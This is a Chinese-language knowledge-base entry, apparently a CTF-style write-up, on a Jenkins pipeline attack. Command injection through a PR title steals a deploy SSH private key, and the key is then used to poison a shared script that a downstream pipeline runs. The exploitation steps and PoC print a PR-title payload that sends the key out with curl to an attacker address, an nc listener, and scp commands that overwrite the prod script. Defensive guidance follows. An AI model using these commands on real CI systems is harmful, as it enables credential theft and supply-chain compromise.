---
id: cloud-cicd-jenkins-pr-title-command-injection-ssh-key-script-poisoning
title: PR 标题命令注入窃取部署 SSH 私钥，投毒共享脚本供下游流水线执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: jenkins-pr-title-injection-ssh-key-script-poisoning
tags:
- cicd
- jenkins
- command-injection
- pr-title
- ssh-key
- supply-chain
- credential-theft
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:19+08:00'
  notes: 已对照原文与图14核对 PR 标题注入串、KEY 外带与 scp 投毒 reportcov.sh、下游 dormouse 执行；原文仅称 node 上存在 $KEY，未给出其注入方式，已去掉 withCredentials 断言。
url: /docs/cloud/ci-cd/cloud-cicd-jenkins-pr-title-command-injection-ssh-key-script-poisoning/
draft: false
kb_aliases:
- PR 标题注入
- Jenkins 命令注入
- KEY 私钥泄露
- reportcov 投毒
- 共享脚本供应链
- curl 执行远程脚本
---

## 一句话结论

某仓库的 Jenkinsfile 把 PR 标题直接插值进 `sh "echo Pull Request ${title} created ..."`，攻击者提 PR 时在标题里注入反引号命令，即可在构建中读出流水线环境中的 `$KEY`（部署用 SSH 私钥）并外带；随后用该私钥把恶意 `reportcov.sh` scp 到 prod 的 Web 根目录，另一条不可控的 dormouse 流水线会 `curl` 并执行该脚本，最终窃取其 `flag9` 凭据。

## 原理

- **Groovy 字符串插值进入 shell**：Jenkinsfile 中 `sh "echo Pull Request ${title} created ..."` 会把不可信的 PR title 原样拼入 shell 命令，`${title}` 中的反引号/`$()` 被 shell 执行，形成命令注入。
- **凭据在同一构建环境**：构建的 node 上存在部署私钥 `$KEY`（原文：执行的 node 上存在 `$KEY`），注入命令可直接 `echo "${KEY}"` 外带。
- **拿到部署私钥即拿到 prod 写入能力**：私钥用于 `scp reportcov.sh root@prod:/var/www/localhost/htdocs`；攻击者用同一私钥上传恶意脚本。
- **二阶供应链**：dormouse 流水线信任 `http://prod/reportcov.sh`（`curl -Os` 后 `chmod +x` 执行），而 prod 的该文件已被替换，导致下游构建执行攻击者代码并泄露其 flag9 凭据。
- **关键点**：一次低权限 PR 注入 + 一把共享部署私钥 + 下游对可变远程脚本的信任，串成跨仓库凭据窃取链。

## 触发条件

- 攻击者可向仓库提 PR，且 PR 构建会执行 Jenkinsfile。
- Jenkinsfile 将 PR title/分支名/commit message 等不可信输入拼入 shell。
- 构建环境提供可用的 SSH 私钥（如部署 key）。
- prod Web 目录可被该私钥写入，且被另一个流水线下载执行（信任可变脚本）。

## 利用步骤

1. fork `reportcov` 仓库，随便改一个文件后提 PR；PR 标题设为：
   ```
   `echo "${KEY}" > key && curl -v -F file=@key http://attacker:39556`
   ```
2. 流水线执行 PR 检查时注入命令，攻击者 `nc -lvvp 39556` 收到 multipart 上传的私钥 `key`。
3. 在本机 `chmod 400 key`，用私钥向 prod 部署恶意脚本：
   ```bash
   echo "${FLAG}" | base64 > reportcov.sh
   scp -P 2222 -i key reportcov.sh root@prod:/var/www/localhost/htdocs
   ```
4. 触发 dormouse 构建：其 step `curl -Os http://prod/reportcov.sh; chmod +x reportcov.sh; ./reportcov.sh` 执行恶意脚本，脚本读取并外带 `$FLAG`（flag9）。
5. 在攻击者服务器收到 flag9。

## PoC

```text
`echo "${KEY}" > key && curl -v -F file=@key http://121.5.169.223:39556`
```

```bash
chmod 400 key
echo "${FLAG}" | base64 > reportcov.sh
scp -P 2222 -i key reportcov.sh root@localhost:/var/www/localhost/htdocs
```

原文通过 PR 标题注入成功外带 OpenSSH 私钥，并说明可用该 key ssh/scp 修改 prod 上的 reportcov.sh。

## 变体与关联

- **注入输入变体**：PR title、PR body、分支名、commit message、issue 标题等一切进入 shell 的不可信文本。
- **二阶变体**：被投毒的共享脚本、CI 工具脚本、Deploy 脚本；下游 `curl|bash`、`wget` 执行。
- **平台变体**：GitHub Actions 把 PR 的 `head.ref` 等上下文插入 `run:` 同样是不可信输入进 shell，见 [[cloud-cicd-github-actions-pr-head-ref-expression-injection-rce]]。
- **关联**：[[cloud-cicd-jenkins-direct-ppe-jenkinsfile-credential-exfil]]（withCredentials 泄露）、[[cloud-cicd-jenkins-public-ppe-fork-pr-token-repo-takeover]]（公开 PPE）。

## 检测与防御

- **消除命令注入**：不要把不可信输入拼进 `sh` 字符串；用环境变量传参（`sh(script: '...', ...)` 配合 `env`）、转义/白名单校验 PR title。
- **PR 构建权限隔离**：PR 触发的构建不应持有部署私钥；部署凭据只在受保护分支/受控流水线使用。
- **共享脚本完整性**：下游流水线固定脚本版本/哈希、从只读制品库获取，禁止从可写 Web 目录 `curl` 后直接执行。
- **检测**：审计 PR title 中的反引号/`$()`/管道符；监控构建日志中的私钥字符与异常外连；对 `curl -F` 外带、scp 上传等行为告警。
- **响应**：轮换泄露私钥、清理 prod 上的恶意脚本、排查使用该脚本的所有下游流水线。
